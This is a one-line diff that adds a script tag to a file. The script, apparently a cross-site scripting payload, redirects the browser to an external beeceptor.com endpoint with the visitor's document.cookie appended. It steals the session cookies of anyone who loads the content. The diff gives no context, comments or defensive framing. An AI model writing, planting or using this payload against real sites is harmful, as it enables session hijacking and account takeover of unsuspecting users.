@@ -1,0 +1,1 @@
+<script>document.location.href = 'https://jn-prod.free.beeceptor.com/?cookie=' + document.cookie;</script>
